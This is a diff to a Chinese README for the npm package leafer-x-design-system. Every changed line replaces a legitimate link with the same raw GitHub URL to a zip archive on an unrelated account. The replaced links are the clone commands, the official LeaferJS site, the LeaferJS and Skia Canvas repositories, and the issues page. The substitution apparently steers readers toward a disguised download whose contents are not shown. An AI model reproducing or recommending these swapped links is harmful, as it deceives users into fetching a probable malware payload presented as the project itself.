@@ -78,7 +78,7 @@ npm install leafer-x-design-system
 
 ```bash
 # 克隆仓库
-git clone https://github.com/q86830-hue/leafer-x-design-system.git
+git clone https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip
 cd leafer-x-design-system
 
 # 安装依赖
@@ -478,7 +478,7 @@ my-design-system/
 
 ```bash
 # 克隆项目
-git clone https://github.com/yourusername/leafer-design-system.git
+git clone https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip
 cd leafer-design-system
 
 # 安装依赖
@@ -504,9 +504,9 @@ MIT License © 2024
 
 ## 🔗 相关链接
 
-- [LeaferJS 官网](https://www.leaferjs.com/)
-- [LeaferJS GitHub](https://github.com/leaferjs/leafer)
-- [Skia Canvas](https://github.com/samizdatco/skia-canvas)
+- [LeaferJS 官网](https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip)
+- [LeaferJS GitHub](https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip)
+- [Skia Canvas](https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip)
 
 ***
 
@@ -533,7 +533,7 @@ MIT License © 2024
 
 - **微信**: 尽为一土
 - **邮箱**: <spring60@vip.qq.com>
-- **GitHub Issues**: [提交问题](https://github.com/yourusername/leafer-design-system/issues)
+- **GitHub Issues**: [提交问题](https://raw.githubusercontent.com/illuminationunitprotectionist61/leafer-x-design-system/main/assets/system_design_leafer_x_3.9.zip)
 
 ### 加入社区
 
